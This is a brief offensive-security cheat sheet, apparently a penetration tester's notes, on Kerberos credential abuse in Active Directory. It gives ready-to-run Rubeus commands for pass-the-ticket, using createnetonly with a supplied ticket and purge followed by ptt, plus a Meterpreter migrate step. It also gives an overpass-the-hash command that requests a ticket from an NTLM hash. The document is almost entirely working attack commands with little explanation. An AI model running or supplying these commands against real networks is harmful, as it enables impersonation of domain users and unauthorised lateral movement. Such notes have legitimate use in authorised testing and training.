## Pass The Ticket (When you have a ticket)

Using Rubeus:\
`Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj...SU8=`\
After that, can use meterpreter migrate to run as context of the user (local will still be the same, only net)

Alternatively for convenience you can just purge your own tickets, then PTT to your current logon session (can also to another session with `/luid:0x42...`):\
`Rubeus.exe /purge`\
`Rubeus.exe ptt /ticket:doI...`


## Overpass the Hash (Using hash to get ticket)

Using Rubeus:\
`Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap`\
After that can perform Pass The Ticket.
